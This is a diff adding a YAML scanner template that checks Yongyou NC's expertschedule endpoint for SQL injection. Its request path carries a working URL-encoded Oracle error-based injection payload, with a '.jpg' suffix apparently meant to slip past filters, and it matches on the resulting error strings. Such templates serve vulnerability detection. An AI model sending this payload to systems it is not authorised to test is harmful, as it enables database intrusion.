@@ -1,0 +1,23 @@
+id: poc-yaml-yongyou-nc-expertschedule-sqli
+info:
+  name: Yongyou NC expertschedule SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for a SQL injection vulnerability in Yongyou NC's expertschedule functionality.
+http:
+  - method: GET
+    path:
+      - "/ebvp/expeval/expertschedule;1.jpg?pkevalset=1%27+AND+6248%3D%28SELECT+UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%286248%3D6248%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29+FROM+DUAL%29--+QtwN"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "XML 语法分析失败"
+          - "SYS.XMLTYPE"
+          - "qkxzq1qpvbq"
+        part: body
